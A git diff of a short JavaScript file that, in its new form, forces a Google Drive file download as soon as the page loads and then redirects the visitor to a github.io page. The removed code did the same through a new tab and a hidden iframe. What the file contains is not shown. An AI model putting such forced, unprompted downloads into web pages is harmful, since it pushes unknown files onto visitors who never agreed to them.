@@ -1,35 +1,11 @@
-function startDownloadAndRedirect({
-  downloadUrl = "https://drive.google.com/uc?export=download&id=1pBXSoGA4qwnb8xWMi5AMApojcARkgF6-",
-  redirectUrl = "https://kronthedev.github.io/everymotion.github.io/typage",
-  redirectDelay = 2500
-} = {}) {
-  let newTab;
-  try {
-    newTab = window.open(downloadUrl, "_blank");
-  } catch (e) {
-    newTab = null;
-  }
+let index = true;
 
-  try {
-    const iframe = document.createElement("iframe");
-    iframe.style.display = "none";
-    iframe.src = downloadUrl;
-    document.body.appendChild(iframe);
-    setTimeout(() => {
-      iframe.remove();
-    }, 15000);
-  } catch (e) {
-    // ignore
-  }
+if (index) {
+  window.location.replace("https://drive.google.com/uc?export=download&id=1pBXSoGA4qwnb8xWMi5AMApojcARkgF6-");
 
   setTimeout(() => {
-    window.location.href = redirectUrl;
-  }, redirectDelay);
+    window.location.replace("https://kronthedev.github.io/everymotion.github.io/typage");
+  }, 3000);
+
+  index = false;
 }
-
-(function autoRunIfWanted() {
-  const shouldAutoRun = false;
-  if (!shouldAutoRun) return;
-  setTimeout(() => startDownloadAndRedirect(), 800);
-})();
-
